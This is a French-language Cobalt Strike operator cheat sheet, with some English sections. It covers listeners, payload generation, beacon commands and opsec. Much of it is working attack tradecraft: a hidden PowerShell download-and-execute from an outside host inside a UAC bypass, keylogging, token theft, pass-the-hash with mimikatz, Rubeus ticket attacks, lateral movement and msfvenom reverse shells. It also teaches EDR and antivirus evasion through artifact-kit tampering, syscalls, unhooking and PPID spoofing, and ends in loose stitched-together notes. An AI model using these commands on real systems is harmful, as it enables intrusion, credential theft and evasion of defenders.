# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` puis vous pouvez sélectionner où écouter, quel type de beacon utiliser (http, dns, smb...) et plus encore.

### Peer2Peer Listeners

Les beacons de ces listeners n'ont pas besoin de communiquer directement avec le C2, ils peuvent communiquer avec lui via d'autres beacons.

`Cobalt Strike -> Listeners -> Add/Edit` puis vous devez sélectionner les beacons TCP ou SMB

* Le **beacon TCP mettra en place un listener sur le port sélectionné**. Pour se connecter à un beacon TCP, utilisez la commande `connect <ip> <port>` depuis un autre beacon.
* Le **beacon smb écoutera dans un pipename avec le nom sélectionné**. Pour se connecter à un beacon SMB, vous devez utiliser la commande `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** pour les fichiers HTA
* **`MS Office Macro`** pour un document office avec une macro
* **`Windows Executable`** pour un .exe, .dll ou service .exe
* **`Windows Executable (S)`** pour un **stageless** .exe, .dll ou service .exe (mieux stageless que staged, moins d'IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Cela générera un script/exécutable pour télécharger le beacon depuis Cobalt Strike dans des formats tels que : bitsadmin, exe, powershell et python.

#### Host Payloads

Si vous avez déjà le fichier que vous souhaitez héberger sur un serveur web, allez simplement à `Attacks -> Web Drive-by -> Host File` et sélectionnez le fichier à héberger et la configuration du serveur web.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Exécuter un binaire .NET local
execute-assembly </path/to/executable.exe>
# Notez que pour charger des assemblies de plus de 1 Mo, la propriété 'tasks_max_size' du profil malléable doit être modifiée.

# Screenshots
printscreen    # Prendre une seule capture d'écran via la méthode PrintScr
screenshot     # Prendre une seule capture d'écran
screenwatch    # Prendre des captures d'écran périodiques du bureau
## Allez à View -> Screenshots pour les voir

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes pour voir les touches pressées

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Injecter l'action de scan de port à l'intérieur d'un autre processus
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Importer le module Powershell
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Cela utilise la version de powershell la plus élevée prise en charge (pas oppsec)
powerpick <cmdlet> <args> # Cela crée un processus sacrificiel spécifié par spawnto, et injecte UnmanagedPowerShell dedans pour une meilleure opsec (pas de journalisation)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Cela injecte UnmanagedPowerShell dans le processus spécifié pour exécuter le cmdlet PowerShell.


# User impersonation
## Génération de token avec des identifiants
make_token [DOMAIN\user] [password] #Créer un token pour usurper un utilisateur dans le réseau
ls \\computer_name\c$ # Essayer d'utiliser le token généré pour accéder à C$ dans un ordinateur
rev2self # Arrêter d'utiliser le token généré avec make_token
## L'utilisation de make_token génère l'événement 4624 : Un compte a été connecté avec succès. Cet événement est très courant dans un domaine Windows, mais peut être restreint en filtrant sur le type de connexion. Comme mentionné ci-dessus, il utilise LOGON32_LOGON_NEW_CREDENTIALS qui est de type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Voler un token depuis pid
## Comme make_token mais en volant le token d'un processus
steal_token [pid] # De plus, cela est utile pour les actions réseau, pas pour les actions locales
## D'après la documentation de l'API, nous savons que ce type de connexion "permet à l'appelant de cloner son token actuel". C'est pourquoi la sortie du Beacon dit Impersonated <current_username> - il usurpe notre propre token cloné.
ls \\computer_name\c$ # Essayer d'utiliser le token généré pour accéder à C$ dans un ordinateur
rev2self # Arrêter d'utiliser le token de steal_token

## Lancer un processus avec de nouvelles identifiants
spawnas [domain\username] [password] [listener] #Faites-le depuis un répertoire avec un accès en lecture comme : cd C:\
## Comme make_token, cela générera l'événement Windows 4624 : Un compte a été connecté avec succès mais avec un type de connexion de 2 (LOGON32_LOGON_INTERACTIVE). Cela détaillera l'utilisateur appelant (TargetUserName) et l'utilisateur usurpé (TargetOutboundUserName).

## Injecter dans un processus
inject [pid] [x64|x86] [listener]
## D'un point de vue OpSec : Ne pas effectuer d'injection inter-plateforme à moins que cela ne soit vraiment nécessaire (par exemple x86 -> x64 ou x64 -> x86).

## Pass the hash
## Ce processus de modification nécessite un patch de la mémoire LSASS, ce qui est une action à haut risque, nécessite des privilèges d'administrateur local et n'est pas très viable si le Processus Protégé Léger (PPL) est activé.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash via mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Sans /run, mimikatz lance un cmd.exe, si vous exécutez en tant qu'utilisateur avec un bureau, il verra le shell (si vous exécutez en tant que SYSTEM, vous êtes bon pour y aller)
steal_token <pid> #Voler le token du processus créé par mimikatz

## Pass the ticket
## Demander un ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Créer une nouvelle session de connexion à utiliser avec le nouveau ticket (pour ne pas écraser celui compromis)
make_token <domain>\<username> DummyPass
## Écrire le ticket sur la machine de l'attaquant depuis une session poweshell & le charger
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket depuis SYSTEM
## Générer un nouveau processus avec le ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Voler le token de ce processus
steal_token <pid>

## Extraire le ticket + Pass the ticket
### Lister les tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump le ticket intéressant par luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Créer une nouvelle session de connexion, noter luid et processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insérer le ticket dans la session de connexion générée
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Enfin, voler le token de ce nouveau processus
steal_token <pid>

# Lateral Movement
## Si un token a été créé, il sera utilisé
jump [method] [target] [listener]
## Méthodes :
## psexec                    x86   Utiliser un service pour exécuter un artefact Service EXE
## psexec64                  x64   Utiliser un service pour exécuter un artefact Service EXE
## psexec_psh                x86   Utiliser un service pour exécuter une ligne de commande PowerShell
## winrm                     x86   Exécuter un script PowerShell via WinRM
## winrm64                   x64   Exécuter un script PowerShell via WinRM
## wmi_msbuild               x64   mouvement latéral wmi avec tâche c# inline msbuild (oppsec)


remote-exec [method] [target] [command] # remote-exec ne retourne pas de sortie
## Méthodes :
## psexec                          Exécution à distance via le Gestionnaire de Contrôle de Service
## winrm                           Exécution à distance via WinRM (PowerShell)
## wmi                             Exécution à distance via WMI

## Pour exécuter un beacon avec wmi (ce n'est pas dans la commande jump), il suffit de télécharger le beacon et de l'exécuter
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Sur l'hôte metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Sur cobalt : Listeners > Ajouter et définir le Payload sur Foreign HTTP. Définissez l'Hôte sur 10.10.5.120, le Port sur 8080 et cliquez sur Enregistrer.
beacon> spawn metasploit
## Vous ne pouvez lancer que des sessions Meterpreter x86 avec le listener étranger.

# Pass session to Metasploit - Through shellcode injection
## Sur l'hôte metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Exécutez msfvenom et préparez le listener multi/handler

## Copier le fichier bin sur l'hôte Cobalt Strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Injecter le shellcode metasploit dans un processus x64

# Pass metasploit session to cobalt strike
## Générer le shellcode Beacon stageless, allez à Attacks > Packages > Windows Executable (S), sélectionnez le listener souhaité, sélectionnez Raw comme type de sortie et sélectionnez Utiliser le payload x64.
## Utilisez post/windows/manage/shellcode_inject dans metasploit pour injecter le shellcode Cobalt Strike généré


# Pivoting
## Ouvrir un proxy socks dans le teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

Le **`execute-assembly`** utilise un **processus sacrificiel** en utilisant l'injection de processus à distance pour exécuter le programme indiqué. Cela est très bruyant car pour injecter à l'intérieur d'un processus, certaines API Win sont utilisées que chaque EDR vérifie. Cependant, il existe des outils personnalisés qui peuvent être utilisés pour charger quelque chose dans le même processus :

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Dans Cobalt Strike, vous pouvez également utiliser BOF (Beacon Object Files) : [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

Le script agressor `https://github.com/outflanknl/HelpColor` créera la commande `helpx` dans Cobalt Strike qui mettra des couleurs dans les commandes indiquant si elles sont des BOFs (vert), si elles sont Frok&Run (jaune) et similaires, ou si elles sont ProcessExecution, injection ou similaires (rouge). Ce qui aide à savoir quelles commandes sont plus discrètes.

### Act as the user

Vous pourriez vérifier des événements comme `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` :

- Sécurité EID 4624 - Vérifiez tous les logons interactifs pour connaître les heures de fonctionnement habituelles.
- Système EID 12,13 - Vérifiez la fréquence d'arrêt/démarrage/sommeil.
- Sécurité EID 4624/4625 - Vérifiez les tentatives NTLM valides/invalide entrantes.
- Sécurité EID 4648 - Cet événement est créé lorsque des identifiants en texte clair sont utilisés pour se connecter. Si un processus l'a généré, le binaire a potentiellement les identifiants en texte clair dans un fichier de configuration ou dans le code.

Lors de l'utilisation de `jump` depuis Cobalt Strike, il est préférable d'utiliser la méthode `wmi_msbuild` pour rendre le nouveau processus plus légitime.

### Use computer accounts

Il est courant que les défenseurs vérifient des comportements étranges générés par des utilisateurs et **excluent les comptes de service et les comptes d'ordinateur comme `*$` de leur surveillance**. Vous pourriez utiliser ces comptes pour effectuer un mouvement latéral ou une élévation de privilèges.

### Use stageless payloads

Les payloads stageless sont moins bruyants que les stagés car ils n'ont pas besoin de télécharger une seconde étape depuis le serveur C2. Cela signifie qu'ils ne génèrent aucun trafic réseau après la connexion initiale, ce qui les rend moins susceptibles d'être détectés par des défenses basées sur le réseau.

### Tokens & Token Store

Faites attention lorsque vous volez ou générez des tokens car il pourrait être possible pour un EDR d'énumérer tous les tokens de tous les threads et de trouver un **token appartenant à un autre utilisateur** ou même SYSTEM dans le processus.

Cela permet de stocker des tokens **par beacon** afin qu'il ne soit pas nécessaire de voler le même token encore et encore. Cela est utile pour le mouvement latéral ou lorsque vous devez utiliser un token volé plusieurs fois :

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Lors du mouvement latéral, il est généralement préférable de **voler un token que de générer un nouveau** ou d'effectuer une attaque pass the hash.

### Guardrails

Cobalt Strike a une fonctionnalité appelée **Guardrails** qui aide à prévenir l'utilisation de certaines commandes ou actions qui pourraient être détectées par les défenseurs. Les Guardrails peuvent être configurés pour bloquer des commandes spécifiques, telles que `make_token`, `jump`, `remote-exec`, et d'autres couramment utilisées pour le mouvement latéral ou l'élévation de privilèges.

De plus, le dépôt [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) contient également quelques vérifications et idées que vous pourriez envisager avant d'exécuter un payload.

### Tickets encryption

Dans un AD, faites attention au chiffrement des tickets. Par défaut, certains outils utiliseront le chiffrement RC4 pour les tickets Kerberos, qui est moins sécurisé que le chiffrement AES et par défaut, les environnements à jour utiliseront AES. Cela peut être détecté par des défenseurs qui surveillent les algorithmes de chiffrement faibles.

### Avoid Defaults

Lors de l'utilisation de Cobalt Strike, par défaut, les pipes SMB auront le nom `msagent_####` et `"status_####`. Changez ces noms. Il est possible de vérifier les noms des pipes existants depuis Cobalt Strike avec la commande : `ls \\.\pipe\`

De plus, avec les sessions SSH, un pipe appelé `\\.\pipe\postex_ssh_####` est créé. Changez-le avec `set ssh_pipename "<new_name>";`.

Aussi dans l'attaque de post exploitation, les pipes `\\.\pipe\postex_####` peuvent être modifiés avec `set pipename "<new_name>"`.

Dans les profils Cobalt Strike, vous pouvez également modifier des choses comme :

- Éviter d'utiliser `rwx`
- Comment le comportement d'injection de processus fonctionne (quelles API seront utilisées) dans le bloc `process-inject {...}`
- Comment le "fork and run" fonctionne dans le bloc `post-ex {…}`
- Le temps de sommeil
- La taille maximale des binaires à charger en mémoire
- L'empreinte mémoire et le contenu DLL avec le bloc `stage {...}`
- Le trafic réseau

### Bypass memory scanning

Certaines EDR scannent la mémoire à la recherche de signatures de malware connues. Cobalt Strike permet de modifier la fonction `sleep_mask` en tant que BOF qui sera capable de chiffrer en mémoire le backdoor.

### Noisy proc injections

Lors de l'injection de code dans un processus, cela est généralement très bruyant, car **aucun processus régulier n'effectue généralement cette action et parce que les moyens de le faire sont très limités**. Par conséquent, cela pourrait être détecté par des systèmes de détection basés sur le comportement. De plus, cela pourrait également être détecté par des EDR scannant le réseau pour **des threads contenant du code qui n'est pas sur le disque** (bien que des processus tels que les navigateurs utilisant JIT aient cela couramment). Exemple : [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Lors du lancement d'un nouveau processus, il est important de **maintenir une relation parent-enfant régulière** entre les processus pour éviter la détection. Si svchost.exec exécute iexplorer.exe, cela semblera suspect, car svchost.exe n'est pas un parent d'iexplorer.exe dans un environnement Windows normal.

Lorsqu'un nouveau beacon est généré dans Cobalt Strike, par défaut, un processus utilisant **`rundll32.exe`** est créé pour exécuter le nouveau listener. Ce n'est pas très discret et peut être facilement détecté par des EDR. De plus, `rundll32.exe` est exécuté sans aucun argument, ce qui le rend encore plus suspect.

Avec la commande suivante de Cobalt Strike, vous pouvez spécifier un processus différent pour générer le nouveau beacon, le rendant moins détectable :
```bash
spawnto x86 svchost.exe
```
Vous pouvez également modifier ce paramètre **`spawnto_x86` et `spawnto_x64`** dans un profil.

### Proxying attackers traffic

Les attaquants auront parfois besoin de pouvoir exécuter des outils localement, même sur des machines Linux, et de faire en sorte que le trafic des victimes atteigne l'outil (par exemple, NTLM relay).

De plus, parfois, pour effectuer une attaque pass-the-hash ou pass-the-ticket, il est plus discret pour l'attaquant **d'ajouter ce hash ou ce ticket dans son propre processus LSASS** localement, puis de pivoter à partir de celui-ci au lieu de modifier un processus LSASS d'une machine victime.

Cependant, vous devez être **prudent avec le trafic généré**, car vous pourriez envoyer un trafic inhabituel (kerberos ?) depuis votre processus de porte dérobée. Pour cela, vous pourriez pivoter vers un processus de navigateur (bien que vous puissiez être pris en train de vous injecter dans un processus, donc pensez à une manière discrète de le faire).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Changer le mot de passe  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Changer powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Changer $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#kit d'artefacts  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
